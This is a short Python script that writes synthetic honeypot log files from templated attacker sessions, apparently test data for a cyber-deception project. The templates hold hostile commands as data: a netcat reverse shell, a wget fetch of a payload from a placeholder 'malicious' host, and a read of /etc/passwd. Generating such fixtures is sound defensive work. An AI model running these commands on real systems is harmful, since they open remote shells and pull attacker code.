#!/usr/bin/env python3
import json, time, random
from pathlib import Path

LOG_DIR = Path.home() / "AI-CyDece" / "data" / "honeypot_logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)

# Templates for different attack behaviors
templates = [
    {
        "source_ip": "192.0.2.10",
        "events": [
            {"ts": time.time(), "cmd": "whoami"},
            {"ts": time.time(), "cmd": "ls -la"}
        ],
        "creds": []
    },
    {
        "source_ip": "198.51.100.5",
        "events": [
            {"ts": time.time(), "cmd": "nc -e /bin/sh 10.0.0.1 4444"},
            {"ts": time.time(), "cmd": "wget http://malicious/payload"}
        ],
        "creds": []
    },
    {
        "source_ip": "203.0.113.12",
        "events": [
            {"ts": time.time(), "cmd": "root"},
            {"ts": time.time(), "cmd": "password123"}
        ],
        "creds": [{"username": "root", "password": "password123"}]
    },
    {
        "source_ip": "198.51.100.7",
        "events": [
            {"ts": time.time(), "cmd": "ls /etc"},
            {"ts": time.time(), "cmd": "cat /etc/passwd"}
        ],
        "creds": []
    }
]

# Create multiple logs
for i in range(5):
    t = random.choice(templates)
    path = LOG_DIR / f"sample_{int(time.time())}_{i}.json"
    with open(path, "w") as f:
        json.dump(t, f, indent=2)
    print("Wrote:", path)
    time.sleep(0.2)
